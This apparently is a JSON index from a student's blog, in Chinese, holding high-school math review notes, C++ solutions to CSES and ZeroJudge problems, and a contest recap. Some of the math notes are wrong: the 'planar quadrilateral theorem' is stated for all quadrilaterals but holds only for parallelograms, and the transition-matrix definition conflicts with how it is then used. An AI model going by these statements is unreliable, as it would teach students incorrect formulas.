三邊長，\\(O\\) 為任意一點\n\\(a \\cdot \\overrightarrow{IA}+b \\cdot\n\\overrightarrow{IB}+c \\cdot \\overrightarrow{IC}=\\vec{0}\\)\n\n孟式定理：\\(\\triangle\nABC\\) 中，若有 \\(D, E, F\\) 在 \\(\\overleftrightarrow{BC}, \\overleftrightarrow{CA},\n\\overleftrightarrow{AB}\\) 上 (0 點或 2 點在邊上)：\n\\(D, E, F\\) 三點共線的必要條件為 \\(\\frac{\\overline{BD}}{\\overline{DC}}\\cdot\\frac{\\overline{CE}}{\\overline{EA}}\\cdot\\frac{\\overline{AF}}{\\overline{FB}}=1\\)\n\n賽瓦定理：\\(\\triangle\nABC\\) 中，若有 \\(D, E, F\\) 在 \\(\\overleftrightarrow{BC}, \\overleftrightarrow{CA},\n\\overleftrightarrow{AB}\\) 上 (1 點或 3 點在邊上)：\n\\(\\overline{AD}, \\overline{BE},\n\\overline{CF}\\) 三線交於一點的必要條件為 \\(\\frac{\\overline{BD}}{\\overline{DC}}\\cdot\\frac{\\overline{CE}}{\\overline{EA}}\\cdot\\frac{\\overline{AF}}{\\overline{FB}}=1\\)\n\n(孟式定理跟賽瓦定理的證明這個老師講得很清楚，影片連結)\n平面四邊形定理：平面四邊形 \\(ABCD\\) 滿足 \\(\\overline{AB}^2+\\overline{BC}^2+\\overline{CD}^2+\\overline{DA}^2\\)\n\\(=\\overline{AC}^2+\\overline{BD}^2\\)\n矩陣：\\(m\\times n\\) 矩陣 \\(A\\) 為 \\(m\\) 列 \\(n\\) 行的數字陣列，記為 \\(A=\\begin{bmatrix}a_{11}&amp;a_{12}&amp;...&amp;a_{1n}\\\\a_{21}&amp;a_{22}&amp;...&amp;a_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{m1}&amp;a_{m2}&amp;...&amp;a_{mn}\\end{bmatrix}\\)\n零矩陣：\\(m\\times n\\) 零矩陣 \\(O\\) 為 \\(m\\) 列 \\(n\\) 行的數字陣列，記為 \\(O_{m\\times\nn}=\\begin{bmatrix}0&amp;0&amp;...&amp;0\\\\0&amp;0&amp;...&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;...&amp;0\\end{bmatrix}\\)\n單位方陣：\\(n\\) 階單位方陣 \\(I\\) 為 \\(n\\) 列 \\(n\\) 行的數字陣列，記為 \\(I_n=\\begin{bmatrix}1&amp;0&amp;...&amp;0\\\\0&amp;1&amp;...&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;...&amp;1\\end{bmatrix}\\)\n轉置矩陣：\\(m\\times n\\) 矩陣 \\(A\\) 的轉置矩陣 \\(A^T\\) 為 \\(n\\) 列 \\(m\\) 行的數字陣列，記為 \\(A^T=\\begin{bmatrix}a_{11}&amp;a_{21}&amp;...&amp;a_{m1}\\\\a_{12}&amp;a_{22}&amp;...&amp;a_{m2}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{1n}&amp;a_{2n}&amp;...&amp;a_{mn}\\end{bmatrix}\\)\n矩陣運算：\n\n矩陣加法：\n\\[\\begin{bmatrix}a_{11}&amp;a_{12}&amp;...&amp;a_{1n}\\\\a_{21}&amp;a_{22}&amp;...&amp;a_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{m1}&amp;a_{m2}&amp;...&amp;a_{mn}\\end{bmatrix}+\\begin{bmatrix}b_{11}&amp;b_{12}&amp;...&amp;b_{1n}\\\\b_{21}&amp;b_{22}&amp;...&amp;b_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\b_{m1}&amp;b_{m2}&amp;...&amp;b_{mn}\\end{bmatrix}=\\begin{bmatrix}a_{11}+b_{11}&amp;a_{12}+b_{12}&amp;...&amp;a_{1n}+b_{1n}\\\\a_{21}+b_{21}&amp;a_{22}+b_{22}&amp;...&amp;a_{2n}+b_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{m1}+b_{m1}&amp;a_{m2}+b_{m2}&amp;...&amp;a_{mn}+b_{mn}\\end{bmatrix}\\]\n\n矩陣乘法：\n\\[\\begin{bmatrix}a_{11}&amp;a_{12}&amp;...&amp;a_{1n}\\\\a_{21}&amp;a_{22}&amp;...&amp;a_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{m1}&amp;a_{m2}&amp;...&amp;a_{mn}\\end{bmatrix}\\begin{bmatrix}b_{11}&amp;b_{12}&amp;...&amp;b_{1p}\\\\b_{21}&amp;b_{22}&amp;...&amp;b_{2p}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\b_{n1}&amp;b_{n2}&amp;...&amp;b_{np}\\end{bmatrix}=\\begin{bmatrix}c_{11}&amp;c_{12}&amp;...&amp;c_{1p}\\\\c_{21}&amp;c_{22}&amp;...&amp;c_{2p}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\c_{m1}&amp;c_{m2}&amp;...&amp;c_{mp}\\end{bmatrix}\\]\n其中 \\(c_{ij}=a_{i1}b_{1j}+a_{i2}b_{2j}+...+a_{in}b_{nj}\\)\n簡單來說就是這樣\n\n注意：\n\n矩陣乘法滿足結合律，即 \\((AB)C=A(BC)\\)\n矩陣乘法滿足分配律，即 \\(A(B+C)=AB+AC\\)，\\((A+B)C=AC+BC\\)\n矩陣乘法不滿足交換律，即 \\(AB\\) 不一定等於 \\(BA\\)\n矩陣乘法不滿足消去律，即 \\(AB=AC\\) 不一定表示 \\(B=C\\)\n當矩陣 \\(A\\) 為 \\(m\\) 列 \\(n\\) 行，矩陣 \\(B\\) 為 \\(n\\) 列 \\(p\\) 行時，\\(AB\\) 為 \\(m\\) 列 \\(p\\) 行\n當矩陣 \\(A\\)、\\(B\\) 不為零矩陣時，\\(AB\\) 不一定不為零矩陣\n\n\n轉移矩陣：\n\n當一方陣滿足 \\([p_ij]\\) 滿足 \\(\\sum_{i=1}^{n} p_{ij}=1\\)，且 \\(0\\leq\np_{ij}\\leq1\\)，則稱此方陣為轉移矩陣\n代表意義：當某現象有 \\(n\\) 種狀態，且各狀態間轉移機率固定時，可將各狀態寫成一矩陣，其中從第 \\(i\\) 狀態轉移到第 \\(j\\) 狀態的機率為 \\(p_{ij}\\)\n若將各狀態初始機率寫成一行矩陣 \\(X_0=\\begin{bmatrix}a_1\\\\a_2\\\\\\vdots\\\\a_n\\end{bmatrix}\\)，則經過一次後各狀態機率為 \\(X_1\\) \\(=\\begin{bmatrix}a_1p_{11}+a_2p_{21}+...+a_np_{n1}\\\\a_1p_{12}+a_2p_{22}+...+a_np_{n2}\\\\\\vdots\\\\a_1p_{1n}+a_2p_{2n}+...+a_np_{nn}\\end{bmatrix}\\)\n\\(=X_0P\\)，則經過 \\(k\\) 次後各狀態機率為 \\(X_k=X_0P^k\\)\n若該現象有一穩定狀態，則 \\(X_k\\) 會趨近於一穩定狀態，即 \\(X_k\\) 會趨近於一矩陣 \\(X\\)，其中 \\(X\\) 滿足 \\(X=XP\\)，則 \\(X\\) 為一轉移矩陣的穩定狀態\n\n高斯約當法：\n方程組 \\(\\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n=b_1\\\\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n=b_2\\\\\\vdots\\\\a_{n1}x_1+a_{n2}x_2+...+a_{nn}x_n=b_n\\end{cases}\\)\n其中 \\(A=\\begin{bmatrix}a_{11}&amp;a_{12}&amp;...&amp;a_{1n}\\\\a_{21}&amp;a_{22}&amp;...&amp;a_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{n1}&amp;a_{n2}&amp;...&amp;a_{nn}\\end{bmatrix}\\) 為其係數矩陣\n加上常數項後為增廣矩陣 \\([A|b]=\\begin{bmatrix}\n\\begin{array}{cccc|c}\na_{11}&amp;a_{12}&amp;...&amp;a_{1n}&amp;b_1\\\\\na_{21}&amp;a_{22}&amp;...&amp;a_{2n}&amp;b_2\\\\\n\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots\\\\\na_{n1}&amp;a_{n2}&amp;...&amp;a_{nn}&amp;b_n\n\\end{array}\n\\end{bmatrix}\\)\n將增廣矩陣利用列運算將 \\([A|b]\\) 化為上三角矩陣 \\([U|c]=\\begin{bmatrix}\n  \\begin{array}{cccc|c}\n  b_{11}&amp;b_{12}&amp;...&amp;b_{1n}&amp;c_1\\\\\n  0&amp;b_{22}&amp;...&amp;b_{2n}&amp;c_2\\\\\n  \\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots\\\\\n  0&amp;0&amp;...&amp;b_{nn}&amp;c_n\n  \\end{array}\n  \\end{bmatrix}\\)\n將對每列除以該列最左邊的非零行首元素，得到 \\([U'|c']=\\begin{bmatrix}\n  \\begin{array}{cccc|c}\n  1&amp;\\frac{b_{12}}{b_{11}}&amp;...&amp;\\frac{b_{1n}}{b_{11}}&amp;\\frac{c_1}{b_{11}}\\\\\n  0&amp;1&amp;...&amp;\\frac{b_{2n}}{b_{22}}&amp;\\frac{c_2}{b_{22}}\\\\\n  \\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots\\\\\n  0&amp;0&amp;...&amp;1&amp;\\frac{c_n}{b_{nn}}\n  \\end{array}\n  \\end{bmatrix}\\)\n最後將 \\([U'|c']\\) 利用列運算將其化為 \\([I|d]=\\begin{bmatrix}\n  \\begin{array}{cccc|c}\n  1&amp;0&amp;...&amp;0&amp;d_1\\\\\n  0&amp;1&amp;...&amp;0&amp;d_2\\\\\n  \\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots\\\\\n  0&amp;0&amp;...&amp;1&amp;d_n\n  \\end{array}\n  \\end{bmatrix}\\)\n若該方程組無解，則 \\([U|c]\\) 中有一列為 \\([0,0,...,0|b]\\)，則 \\(b\\neq0\\)\n若該方程式有無限多組解，則 \\([U|c]\\) 中有一列為 \\([0,0,...,0|0]\\)\n克拉瑪公式：\n方程組 \\(\\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n=b_1\\\\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n=b_2\\\\\\vdots\\\\a_{n1}x_1+a_{n2}x_2+...+a_{nn}x_n=b_n\\end{cases}\\)\n其中 \\(A=\\begin{bmatrix}a_{11}&amp;a_{12}&amp;...&amp;a_{1n}\\\\a_{21}&amp;a_{22}&amp;...&amp;a_{2n}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\a_{n1}&amp;a_{n2}&amp;...&amp;a_{nn}\\end{bmatrix}\\)，\\(A_i\\) 為將 \\(A\\) 的第 \\(i\\) 行替換為 \\(b_1,b_2,...,b_n\\) 後所得矩陣\n若 \\(det(A)\\neq0\\)，則 \\(x_1=\\frac{det(A_1)}{det(A)}\\) \\(,x_2=\\frac{det(A_2)}{det(A)},...,\\) \\(x_n=\\frac{det(A_n)}{det(A)}\\)\n\\(A^{-1}=\\frac{\\mathrm{adj}(A)}{\\det(A)}\\)\n\n二階矩陣：\\(A=\\begin{bmatrix}a&amp;b\\\\c&amp;d\\end{bmatrix}\\)，\\(A^{-1}=\\frac{1}{ad-bc}\\begin{bmatrix}d&amp;-b\\\\-c&amp;a\\end{bmatrix}\\)\n\n若 \\(A,P\\) 為 \\(n\\) 階矩陣，\\(P\\) 為可逆矩陣，則 \\((P^{-1}AP)^k=P^{-1}A^kP\\)\n\\(det(AB)=det(A)det(B)\\)，其中 \\(A, B \\in \\mathbb{R}^{n\\times n}\\)，這有證明\n\n證明待補🫠\n空間 \n\n平面方程式：\n\n一般式：\\(Ax+By+Cz+D=0\\)\n(法向量 \\(\\vec{n}=(A,B,C)\\))\n\n點法式：\\((x-x_0,y-y_0,z-z_0)\\cdot\\vec{n}=0\\)\n截距式：\\(\\frac{x}{a}+\\frac{y}{b}+\\frac{z}{c}=1\\)\n(\\(x\\)、\\(y\\)、\\(z\\) 軸之截距為 \\(a,b,c\\))\n\n三垂線定理：若 \\(\\overleftrightarrow{AB}\\perp\\) 平面 \\(E\\) 交於 \\(B\\) 點，\\(\\overleftrightarrow{BC}\\) 在平面 \\(E\\) 上，若有一直線 \\(L\\) 於平面 \\(E\\) 上，且 \\(\\overleftrightarrow{BC}\\perp L\\) 於 \\(C\\) 點，則 \\(\\overleftrightarrow{AC}\\perp L\\) 於 \\(C\\) 點\n\n平行六面體的有號體積：\\(V=\\vec{a}\\cdot(\\vec{b}\\times\\vec{c})=\\begin{vmatrix}a_1&amp;a_2&amp;a_3\\\\b_1&amp;b_2&amp;b_3\\\\c_1&amp;c_2&amp;c_3\\end{vmatrix}\\)\n空間中三向量所張出的四面體有號體積：\\(V=\\frac{1}{6}\\vec{a}\\cdot(\\vec{b}\\times\\vec{c})=\\frac{1}{6}\\begin{vmatrix}a_1&amp;a_2&amp;a_3\\\\b_1&amp;b_2&amp;b_3\\\\c_1&amp;c_2&amp;c_3\\end{vmatrix}\\)\n平面 \\(E_1\\)、\\(E_2\\) 夾角：\\(\\cos\\theta=\\pm\\frac{\\vec{n_1}\\cdot\\vec{n_2}}{|\\vec{n_1}||\\vec{n_2}|}\\)，其中 \\(\\vec{n_1}\\)、\\(\\vec{n_2}\\) 為平面 \\(E_1\\)、\\(E_2\\) 的法向量\n點到平面距離：\\(d=\\frac{|\\vec{n}\\cdot\\vec{OP}|}{|\\vec{n}|}\\)，其中 \\(\\vec{n}\\) 為平面法向量，\\(\\vec{OP}\\) 為平面上一點到此平面上一點的向量\n平面 \\(E_1\\)、\\(E_2\\) 交於一線，則平面 \\(E_1\\)、\\(E_2\\) 之角平分面為 \\(\\frac{a_1x+b_1y+c_1z+d_1}{\\\\sqrt{a_1^2+b_1^2+c_1^2}}=\\pm\\frac{a_2x+b_2y+c_2z+d_2}{\\sqrt{a_2^2+b_2^2+c_2^2}}\\)\n平面系平面 \\(E_1\\)、\\(E_2\\) 交於一線，則平面：\\(a(a_1x+b_1y+c_1z+d_1)+\\) \\(b(a_2x+b_2y+c_2z+d_2)=0\\)，與 \\(E_1\\)、\\(E_2\\) 共線\n\n證明待補🫠\n參考文獻 \n\n臺北市立成功高級中學數學科教學研究團隊 (2021)。高中數學演習\n第一冊。臺北市立成功高級中學。\n\n臺北市立成功高級中學數學科教學研究團隊 (2022)。高中數學演習\n第二冊。臺北市立成功高級中學。\n\n臺北市立成功高級中學數學科教學研究團隊 (2022)。高中數學演習\n第三冊。臺北市立成功高級中學。\n\n臺北市立成功高級中學數學科教學研究團隊 (2023)。高中數學演習\n第四冊。臺北市立成功高級中學。\n\n臺北市立建國高級中學數學科教學研究會 (2022)。數學科學習資料\n第三冊。臺北市立建國高級中學。\n\n臺北市立建國高級中學數學科教學研究會 (2022)。數學科學習資料\n第四冊。臺北市立建國高級中學。\n\n我的腦袋 (2023)。高中數學科神奇資料\n一到四冊。臺北市熊貓高級中學\n\n心得 \n感覺我好像自從上了高中，好像除了線性代數，好像就沒有在學到甚麼新的知識了，不過要是說我高一就開始繼續往後學，然後認真讀書，而不去玩那些機器人，我大概也不要吧，即便到了最後，特選也沒上，學測倒數 45 天才開始認真讀，但要我重新來過，我應該也還是會選一樣的路吧，是說想這麼多也沒什麼用，我還是追得上吧，畢竟要比讀書，我應該也不差的╰(°▽°)╯\n","categories":["數學"],"tags":["證明","數學","高中","學測"]},{"title":"Elevator Rides (CSES 1653)","url":"/CSES_1653/","content":"題目網址\nThere are n people who want to get to the top of a building which has\nonly one elevator. You know the weight of each person and the maximum\nallowed weight in the elevator. What is the minimum number of elevator\nrides?\n\n\n解題思路：\n位元 DP，分別記錄該狀態下最少搭乘次數以及在最少搭乘次數下的最輕的電梯重量，DP 轉移式在下方程式碼中的註解\n\nElevator Rides#include &lt;bits/stdc++.h&gt;#define int long long#define pii pair&lt;int, int&gt;#define F first#define S second#define rep(i, a, b) for(int i = a; i&lt;=b; ++i)#define rev(i, a, b) for(int i = a; i&gt;=b; --i)#define tomax(a, b) (a)=max((a),(b))#define tomin(a, b) (a)=min((a),(b))#define all(a) a.begin(), a.end()#define pb push_back#define eb emplace_back#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0)using namespace std; // dp[i][0] : minimum rides// dp[i][1] : minimum weight // init// dp[i][0] = n// dp[i][1] = INT_MAX// dp[0][0] = 1, dp[0][1] = 0 // dp[i][0]_ori = dp[i][0]// new_weight = dp[i^(1&lt;&lt;j)][1] + w[j]                        , j in i// dp[i][0] = min(dp[i][0], dp[i^(1&lt;&lt;j)][0]+(new_weight&gt;x))   , j in i// dp[i][1] = min(dp[i][1], new_weight)                       , dp[i][0]==dp[i][0]_ori &amp;&amp; new_weight&lt;=x// dp[i][1] = new_weight                                      , dp[i][0]&lt;dp[i][0]_ori  &amp;&amp; new_weight&lt;=x// dp[i][1] = w[j]                                            , dp[i][0]&lt;=dp[i][0]_ori &amp;&amp; new_weight&gt;x int dp[1&lt;&lt;21][3];int n, w[22], x; signed main(){    ios;    cin &gt;&gt; n &gt;&gt; x;    rep(i, 0, n-1) cin &gt;&gt; w[i];    rep(i, 0, 1&lt;&lt;n)        dp[i][0]=n, dp[i][1]=INT_MAX;    dp[0][0] = 1, dp[0][1] = 0;    rep(i, 1, (1&lt;&lt;n)-1){        rep(j, 0, n-1){            if(i &amp; (1&lt;&lt;j)){                int new_weight = (dp[i^(1&lt;&lt;j)][1]) + w[j];                if(dp[i][0] &gt;= dp[i^(1&lt;&lt;j)][0]+(new_weight&gt;x)){                    if(dp[i][0] == dp[i^(1&lt;&lt;j)][0] &amp;&amp; (new_weight&lt;=x))                        dp[i][1] = min(dp[i][1], new_weight);                    else dp[i][1] = new_weight&gt;x ? w[j] : new_weight;                    dp[i][0] = dp[i^(1&lt;&lt;j)][0]+(new_weight&gt;x);                }            }        }    }    cout &lt;&lt; dp[(1&lt;&lt;n)-1][0] &lt;&lt; '\\n';    return 0;}\nP.S.\n這題我原本一開始把 \\(dp[i][0]\\) 設成 \\(x\\)，debug 了一個多小時…\n另外這是我第一次寫位元 dp 感覺超酷的~\n\n","categories":["程式題解","CSES"],"tags":["CSES","DP","位元DP"]},{"title":"Gray Code (CSES 2205)","url":"/CSES_2205/","content":"題目網址\nA Gray code is a list of all \\(2^n\\)\nbit strings of length \\(n\\), where any\ntwo successive strings differ in exactly one bit (i.e., their Hamming\ndistance is one).\nYour task is to create a Gray code for a given length \\(n\\).\n\n\n解題思路：\n這題實作上非常簡單，但就是在想解題的過程很有趣，我想到一種一定是解的作法，有遞迴的感覺，底下舉個例子：\n\\(n=1\\):\n0\n1\n\\(n=2\\):\n00\n01\n11\n10\n\\(n=3\\):\n000\n001\n011\n010\n110\n111\n101\n100\n會發現 \\(n\\) 的 Gray Code 就是在 \\(n-1\\) 的 Gray Code 前面加上 0，再把 \\(n-1\\) 的 Gray\nCode 反過來加上 1，這樣就能保證相鄰的兩個字串只有一個 bit 不同，而且也能保證所有的字串都會出現，所以就是一定是解，但只知道這樣其實在實作上會有點麻煩，會需要紀錄之前的 Gray\nCode，其實可以發現每一位之間是有規律的，以最右邊的一位為例，必定會是 011001100110…，第二位就是 0011110000111100…，第 \\(i\\) 為的間格會是 \\(2^i\\)，那就可以一位位分析應該擺 0 或 1，但再仔細觀察一下，這樣的關係，恰好會是兩位之間 XOR = 1 的間格，以第一位為例：\n無論數字多大，位元的第一和第二位都會是如下規律：\n00\n01\n10\n11\n00\n01\n10\n11\n00\n…\n兩位間 XOR 關係後恰巧會是：011001100110…\n而若是第二位：\n無論數字多大，位元的前三位都會是如下規律：\n000\n001\n011\n010\n110\n111\n101\n100\n000\n…\n第二三位間 XOR 關係後恰巧會是：0011110000111100…\n以此類推，最後一位就看目前有沒有過半，過半前是 0，過半後是 1，就能輕鬆秒殺這題了。\n\nGray Code#include &lt;bits/stdc++.h&gt;#define ios ios_base::sync_with_stdio(0), cin.tie(0), cout.tie(0);#define pii pair&lt;int, int&gt;#define int long long#define rep(i, a, b) for(int i = a; i&lt;=b; i++ )#define rev(i, a, b) for(int i = a; i&gt;=b; i-- )#define tomax(a, b) (a)=max((a), (b))#define tomin(a, b) (a)=min((a), (b))#define pb push_back#define eb emplace_backusing namespace std;signed main(){    ios    int n;    cin &gt;&gt; n;    rep(i, 0, (1&lt;&lt;n)-1){        cout &lt;&lt; (i&gt;&gt;(n-1));        rev(j, n-2, 0)            cout &lt;&lt; (((i&gt;&gt;j)&amp;1) ^ ((i&gt;&gt;(j+1))&amp;1));        cout &lt;&lt; '\\n';    }    return 0;}\n","categories":["程式題解","CSES"],"tags":["CSES"]},{"title":"APCS 先加後乘與函數 (zerojudge j607)","url":"/zerojudge_j607/","content":"題目網址\n給一個運算式，運算式的內容由數字、+、* 和 \\(f()\\) 某個函式 \\(f()\\) 所組成，除了函式 \\(f()\\) 以外不會有額外的括號。請將此運算式依照先加後乘的方式運算。\n函式 \\(f()\\) 定義為從這個不定長度的參數 \\(x_1, x_2, x_3, x_4,\n...\\) 中的最大值扣掉最小值。例如 \\(f(3,6,2)=6-2=4\\)，\\(f(3)=0\\)。\n\n\n解題思路：\n遇到 + 就直接加上去\n遇到 * 先把後面做好\n遇到 f 把到) 之前的每個數字記錄下來最後再比較\n🌟可以一開始把)的位置存起來，複雜度就可以是很漂亮的 \\(O(N)\\)，不過不用也沒關係，這題長度不超過 500，所以可以邊做邊找，複雜度到 \\(O(N^2)\\) 也沒什麼差，向我寫的程式就是邊做邊找的。\n\nAPCS 先加後乘與函數#include &lt;bits/stdc++.h&gt;#define int long longusing namespace std;string in;int len;// 遇到+ 就直接加上去// 遇到* 先把後面做好// 遇到f 把到)之前的每個數字記錄下來最後再比較int calculate(int idx, int sum){    if(idx&gt;=len || in[idx]==',' || in[idx]==')') return sum;    if(in[idx] == '+') return calculate(idx+1, sum);    if(in[idx] == '*') return sum*calculate(idx+1, 0);    if(in[idx] == 'f'){        int end_idx = idx, left_num=0;        while(in[end_idx]!=')' || left_num&gt;0) //可在一開始建好每個函數結尾位置，複雜度可縮短至O(N)            end_idx++, left_num+=(in[end_idx]=='(')-(in[end_idx]==')');         int Min = 100004, Max = -1;        idx++; // '(' 的位置        while(in[idx] != ')'){            idx++;            int cur = calculate(idx, 0);            Min = min(Min, cur);            Max = max(Max, cur);            while(in[idx]!=',' &amp;&amp; idx&lt;end_idx)                 idx++, left_num+=(in[idx]=='(')-(in[idx]==')');        }        return calculate(idx+1,sum+(Max-Min));    }    if(in[idx]&gt;='0' &amp;&amp; in[idx]&lt;='9'){        vector&lt;int&gt; add;        int res = 0, pos=1;        while(in[idx]&gt;='0' &amp;&amp; in[idx]&lt;='9') add.push_back(in[idx++]-'0'), pos*=10;        for(int i : add) pos/=10, res+=i*pos;        return calculate(idx,sum+res);    } return -1;}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin &gt;&gt; in;    in = \"+\" + in;    len = in.size();    cout &lt;&lt; calculate(0, 0) &lt;&lt; '\\n';    return 0;}\nPS：這題我上個月就寫了，但好像後來忘記丟上來 XD\n\n\nAC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"2023 臺北市資訊學科能力競賽","url":"/thspc2023/","content":"前言 \n第一次打北市賽，也是最後一次，雖然說好像進步空間還很大（好像還可以再多個 100 分，不過這樣也頂多三等獎 ww），從今年三月上資芽算法班第一次接觸演算法，不過我應該是高三開學才開始在練題目，然後校內賽完開始培訓才開始練比賽（個人感覺練題目跟練比賽好像不太一樣，通常練題目習慣應該就是要拿滿分解，但競賽是要快速得到你所能得到的最大分數，這也跟我沒少拿了差不多 100 分有關 QQ）。\n\npA 100/100 \n這題有點像約瑟夫但每個人有 \\(K\\) 條命，然後每次經過 \\(N\\) 個人，但好像師大伺服器比較快？時限 2 秒，我想說先用 linked\nlist 試試看複雜度 \\(O(NSK)\\)(\\(N&lt;10000, S&lt;500,\nk&lt;6\\))，然後就 AC 了！（好像有人 \\(N^2\nK\\) 過了，師大測資 XD），賽後才知道好像用線段樹可以有 \\(O(NK log\nN)\\)，寫法大概應該就是我之前寫的那題 APCS-2016-1029-3 定時 K\n彈\npB 17/100 \n我 de 了一個半小時的 bug 結果只有 17 分🥲，大燒雞。\n題目是說有兩類保健食品，各 n、m 個，然後接下來會說哪些不能一起用，問說能一起用的最大保健食品數，我一開始是把不能一起的連在一起做最大匹配，最後再輸出全部剪去最大匹配的數量，不知道哪裡有問題，只有第一子題對，後面都 WA，感覺應該是我少判了什麼（其實我在這題之前根本沒寫過最大匹配的題目 www），但因為可能剛好第一子題沒有戳到所以就過了🤔\npC 100/100 \n這應該是這次最水的，我有點忘了題目是什麼，但我好像是用有點用雙指針的方法，然後我用 map 存某個東西，最後複雜度是 \\(O(N log N)\\)，這題好像 10 分鐘我就寫完了\npD 0/100 \n區間眾數裸題，不過我不會，我想說用線段樹撈子題（結果賽後別人講才知道用前綴和就能撈了🙃，資結中毒），然後我把邏輯判斷的&amp;&amp;打成,，超級笨我花了 10 分鐘找 bug 結果找不到，就到此結束了…\npE 0 / 100 （沒看到） \npF 0 / 100 （沒看到） \n總結 \n策略錯誤🫠，雖然好像常常總是有人講說要先看完所有題敘按順序寫，不過我總是想說我就按順序看，要是我有想法我就直接做一做，反正如果說我看完發現其他更簡單的，前面次簡單的題目我也一定能做出來，還能省下重複讀題的時間，結果就是大燒雞🐓，聽說第六題好像挺簡單的，真的好可惜。\n另外這次題目真的有比較簡單，比賽前我們模的每場都還簡單，也很明顯出現了四個破台，然後我只有佳作🥲，不過已經還可以了啦。半年前資芽算法班接觸到演算法，兩個月前開始練題目，同時還有特選在忙，在⼀次次的練習中我了解到我在程式競賽上的天分，我漸漸能跟上早我⼀兩年開始的其他⼈，能⼀起討論題⽬，⽽最後在北市賽中得到佳作，只拿到兩題全對和⼀題⼦題分數，我知道我的實⼒應該還可以更⾼，⾄少在⼦題的部分還可以再拿到快⼀百分，我會繼續練習，也希望能在不久後的 NPSC 拿到好成績，總之，這次經驗真的是很值得紀念。\n最後成績：\n總分 217 / 600\nrank 45\n","categories":["比賽"],"tags":["比賽"]},{"title":"CSES Introductory Problems","url":"/CSES_Introductory_Problems/","content":"前言 \nCSES Introductory Problems 的 AC 程式碼\n\nCSES Problem Set\n我的 Profile\n我的程式們\nWeird Algorithm \nWeird Algorithm#include&lt;bits/stdc++.h&gt;#define int long longusing namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int x;    cin &gt;&gt; x;    cout &lt;&lt; x &lt;&lt; ' ';    while(x!=1){        if(x%2) x=x*3+1;        else x=x/2;        cout &lt;&lt; x &lt;&lt; ' ';    }    return 0;}\nMissing Number \nMissing Number#include&lt;bits/stdc++.h&gt;#define int long longusing namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n;    cin &gt;&gt; n;    bool arr[200005];    memset(arr, 0, sizeof(arr));    for(int i = 0, tmp; i&lt;n-1; i++)        cin &gt;&gt; tmp, arr[tmp]=1;    int ans;    for(int i = 1; i&lt;=n; i++)        if(!arr[i])            ans = i;    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nRepetitions \nRepetitions#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))using namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    string in;    cin &gt;&gt; in;    int ans = 1;    vector&lt;char&gt; rep;    rep.eb(in[0]);    for(int i=1; in[i]; i++){        if(in[i] != rep.back()) tomax(ans, (int)rep.size()), rep.clear();        rep.eb(in[i]);    }cout &lt;&lt; tomax(ans, (int)rep.size()) &lt;&lt; '\\n';    return 0;}\nIncreasing Array \nIncreasing Array#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))using namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n;    cin &gt;&gt; n;    int ans = 0, last;    cin &gt;&gt; last;    for(int i = 1, tmp; i&lt;n; i++)        cin &gt;&gt; tmp, ans+=(last-tmp)*(tmp&lt;last), tomax(last, tmp);    cout &lt;&lt; ans &lt;&lt; '\\n';    return 0;}\nPermutations \nPermutations#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))using namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int n;    cin &gt;&gt; n;    if(n==1) cout &lt;&lt; \"1\\n\";    else if(n&lt;=3) cout &lt;&lt; \"NO SOLUTION\\n\";    else if(n==4) cout &lt;&lt; \"3 1 4 2\\n\";    else{        for(int i = 1; i&lt;=n; i+=2)            cout &lt;&lt; i &lt;&lt; ' ';        for(int i = 2; i&lt;=n; i+=2)            cout &lt;&lt; i &lt;&lt; ' ';    }    return 0;}\nNumber Spiral \nNumber Spiral#include&lt;bits/stdc++.h&gt;#define int long long#define eb emplace_back#define pb push_back#define tomax(a, b) ((a)=max(a,b))#define tomin(a, b) ((a)=min(a,b))using namespace std; signed main(){    ios::sync_with_stdio(0);    cin.tie(0), cout.tie(0);    int t;    cin &gt;&gt; t;    while(t--){        int y, x;        cin &gt;&gt; y &gt;&gt; x;        if(x &gt;= y)             if(x%2) cout &lt;&lt; x*x-(y-1) &lt;&lt; '\\n';            else cout &lt;&lt; (x-1)*(x-1)+(y) 